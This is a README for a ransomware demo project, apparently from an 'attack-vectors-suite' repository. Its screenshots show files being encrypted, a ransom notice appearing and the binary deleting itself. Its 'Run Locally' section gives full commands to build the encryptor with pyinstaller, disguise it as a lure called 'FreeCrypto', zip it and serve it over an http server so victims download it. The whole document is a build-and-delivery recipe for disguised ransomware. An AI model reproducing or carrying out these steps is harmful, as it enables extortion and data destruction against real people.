# Ransomware
**Ransomware is a type of malware from cryptovirology that threatens to publish the victim's personal data or permanently block access to it unless a ransom is paid** - Wikipedia

## Demo
#### Generate key
![image](https://user-images.githubusercontent.com/74037707/193447924-733a01f1-f6b0-4a4e-8f32-b656e39a8111.png)
![image](https://user-images.githubusercontent.com/74037707/193447960-3fb7b5b2-96a0-4254-b778-6deb24fe61b3.png)
#### Create binary executable for the encryption script
![image](https://user-images.githubusercontent.com/74037707/193447961-6e4f9953-0725-457c-8c6d-3ffdcb71f92e.png)
#### Compress the binary executable
![image](https://user-images.githubusercontent.com/74037707/193447964-513aec86-d3a6-47d2-a20f-b452fe20209e.png)
#### Force downloading the binary executable on the victim's machine
![image](https://user-images.githubusercontent.com/74037707/193447969-c6dfd22e-079e-4202-8cca-53e804bfca57.png)
![image](https://user-images.githubusercontent.com/74037707/193447976-d308d28c-0737-4d30-886c-88c77bad485d.png)
#### On running the binary executable, it encrypts and leaves a ransom notice. Then it deletes itself
![image](https://user-images.githubusercontent.com/74037707/193447978-9f18a916-2328-483c-9d75-279c291ca5df.png)
![image](https://user-images.githubusercontent.com/74037707/193447981-299673c5-e2ad-4750-8497-da23bfb1fee6.png)
![image](https://user-images.githubusercontent.com/74037707/193447986-12b2eb95-30a1-453f-9a51-6e161a20702c.png)
![image](https://user-images.githubusercontent.com/74037707/193447989-60d20ce8-13a2-427d-8358-d2fd00c1f9b3.png)

## Run Locally

Clone the project

```bash
  git clone https://github.com/SANTHOSH17-DOT/attack-vectors-suite
```

Go to the project directory

```bash
  cd ./RANSOMWARE
```

Generate key and add it to ./encryption/encrypt.py file

```bash
  cd ./key
  python3 generate_key.py
  cd ..
```

Create binary executable for the encryption script

```bash
  cd ./encryption
  pyinstaller --onefile encrypt.py
  cd ..
```

Compress the exe file to preserve the file permissions

```bash
  cp ./encryption/dist/encrypt ./webpage/FreeCrypto`
  cd ./webpage
  zip ./FreeCrypto.zip ./FreeCrypto
```

Start a http server in the webpage directory

```bash
  python3 -m http.server 9000
```

